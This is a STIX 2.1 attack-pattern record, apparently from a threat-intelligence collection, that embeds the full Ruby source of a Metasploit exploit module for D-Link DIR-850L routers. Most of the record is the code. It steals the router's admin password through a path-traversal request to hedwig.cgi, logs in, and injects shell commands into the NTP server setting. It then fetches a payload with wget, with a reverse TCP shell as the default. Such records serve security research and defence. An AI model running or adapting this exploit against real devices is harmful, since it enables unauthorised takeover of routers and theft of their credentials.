{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9aaeb6eb-342d-4483-86c0-6b86b72b06e9",
    "created": "2024-08-14T17:02:37.183363Z",
    "modified": "2024-08-14T17:02:37.183367Z",
    "name": "DIR-850L (Un)authenticated OS Command Exec",
    "description": " This module leverages an unauthenticated credential disclosure vulnerability to then execute arbitrary commands on DIR-850L routers as an authenticated user. Unable to use Meterpreter payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dir850l_unauth_exec.rb",
            "external_id": "dlink_dir850l_unauth_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.seebug.org/vuldb/ssvid-96333"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3310"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'DIR-850L (Un)authenticated OS Command Exec',\n      'Description' => %q{\n        This module leverages an unauthenticated credential disclosure\n        vulnerability to then execute arbitrary commands on DIR-850L routers\n        as an authenticated user. Unable to use Meterpreter payloads.\n      },\n      'Author' => [\n        'Mumbai', # https://github.com/realoriginal (module)\n        'Zdenda' # vuln discovery\n      ],\n      'References' => [\n        ['URL', 'https://www.seebug.org/vuldb/ssvid-96333'],\n        ['URL', 'https://blogs.securiteam.com/index.php/archives/3310'],\n      ],\n      'DisclosureDate' => '2017-08-09',\n      'License' => MSF_LICENSE,\n      'Platform' => 'linux',\n      'Arch' => ARCH_MIPSBE,\n      'DefaultTarget' => 0,\n      'DefaultOptions' => {\n        'PAYLOAD' => 'linux/mipsbe/shell/reverse_tcp'\n      },\n      'Privileged' => true,\n      'Payload' => {\n        'DisableNops' => true,\n      },\n      'Targets' => [[ 'Automatic', {} ]],\n    ))\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => '/',\n        'method' => 'GET'\n        })\n      if res && res.headers['Server']\n        auth = res.headers['Server']\n        if auth =~ /DIR-850L/\n          if auth =~ /WEBACCESS\\/1\\.0/\n            return Exploit::CheckCode::Safe\n          else\n            return Exploit::CheckCode::Detected\n          end\n        end\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  # some other DIR-8X series routers are vulnerable to this same retrieve creds vuln as well...\n  # should write an auxiliary module to-do -> WRITE AUXILIARY\n  def retrieve_creds\n    begin\n      xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\\r\\n\"\n      xml << \"<postxml>\\r\\n\"\n      xml << \"<module>\\r\\n\"\n      xml << \"  <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\\r\\n\"\n      xml << \"</module>\\r\\n\"\n      xml << \"</postxml>\"\n      res = send_request_cgi({\n        'uri' => '/hedwig.cgi',\n        'method' => 'POST',\n        'encode_params' => false,\n        'headers' => {\n          'Accept-Encoding' => 'gzip, deflate',\n          'Accept' => '*/*'\n        },\n        'ctype' => 'text/xml',\n        'cookie' => \"uid=#{Rex::Text.rand_text_alpha_lower(8)}\",\n        'data' => xml,\n      })\n      if res.body =~ /<password>(.*)<\\/password>/ # fixes stack trace issue\n        parse = res.get_xml_document\n        username = parse.at('//name').text\n        password = parse.at('//password').text\n        vprint_good(\"#{peer} - Retrieved the username/password combo #{username}/#{password}\")\n        loot = store_loot(\"dlink.dir850l.login\", \"text/plain\", rhost, res.body)\n        print_good(\"#{peer} - Downloaded credentials to #{loot}\")\n        return username, password\n      else\n        fail_with(Failure::NotFound, \"#{peer} - Credentials could not be obtained\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{peer} - Unable to connect to target.\")\n    end\n  end\n\n  def retrieve_uid\n    begin\n      res = send_request_cgi({\n          'uri' => '/authentication.cgi',\n          'method' => 'GET',\n      })\n      parse = res.get_json_document\n      uid = parse['uid']\n      challenge = parse['challenge']\n      return uid, challenge\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{peer} - Unable to connect to target.\")\n    end\n  end\n\n  def login(username, password)\n    uid, challenge = retrieve_uid\n    begin\n      hash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('md5'), password.to_s, (username.to_s + challenge.to_s)).upcase\n      send_request_cgi({\n        'uri' => '/authentication.cgi',\n        'method' => 'POST',\n        'data' => \"id=#{username}&password=#{hash}\",\n        'cookie' => \"uid=#{uid}\"\n      })\n      return uid\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{peer} - Unable to connect to target.\")\n    end\n  end\n\n  def execute_command(cmd, opts)\n    uid = login(@username, @password) # reason being for loop is cause UID expires for some reason after executing 1 command\n    payload = \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\\r\\n\"\n    payload << \"<postxml>\\r\\n\"\n    payload << \"<module>\\r\\n\"\n    payload << \"  <service>DEVICE.TIME</service>\\r\\n\"\n    payload << \"  <device>\\r\\n\"\n    payload << \"    <time>\\r\\n\"\n    payload << \"      <ntp>\\r\\n\"\n    payload << \"        <enable>1</enable>\\r\\n\"\n    payload << \"        <period>604800</period>\\r\\n\"\n    payload << \"        <server>#{Rex::Text.rand_text_alpha_lower(8)}; (#{cmd}&); </server>\\r\\n\"\n    payload << \"      </ntp>\\r\\n\"\n    payload << \"      <ntp6>\\r\\n\"\n    payload << \"        <enable>1</enable>\\r\\n\"\n    payload << \"        <period>604800</period>\\r\\n\"\n    payload << \"      </ntp6>\\r\\n\"\n    payload << \"      <timezone>20</timezone>\\r\\n\"\n    payload << \"      <time/>\\r\\n\"\n    payload << \"      <date/>\\r\\n\"\n    payload << \"      <dst>0</dst>\\r\\n\"\n    payload << \"      <dstmanual/>\\r\\n\"\n    payload << \"      <dstoffset/>\\r\\n\"\n    payload << \"    </time>\\r\\n\"\n    payload << \"  </device>\\r\\n\"\n    payload << \"</module>\\r\\n\"\n    payload << \"</postxml>\"\n    begin\n      # save configuration\n      res = send_request_cgi({\n        'uri' => '/hedwig.cgi',\n        'method' => 'POST',\n        'ctype' => 'text/xml',\n        'data' => payload,\n        'cookie' => \"uid=#{uid}\"\n      })\n      # execute configuration\n      res = send_request_cgi({\n        'uri' => '/pigwidgeon.cgi',\n        'method' => 'POST',\n        'data' => 'ACTIONS=SETCFG,ACTIVATE',\n        'cookie' => \"uid=#{uid}\"\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{peer} - Unable to connect to target.\")\n    end\n  end\n\n\n  def exploit\n    print_status(\"#{peer} - Connecting to target...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access vulnerable url\")\n    end\n    #\n    # Information Retrieval, obtains creds and logs in\n    #\n    @username, @password = retrieve_creds\n    execute_cmdstager(\n      :flavor => :wget,\n      :linemax => 200\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-09",
    "x_mitre_platforms": [
        "linux'"
    ]
}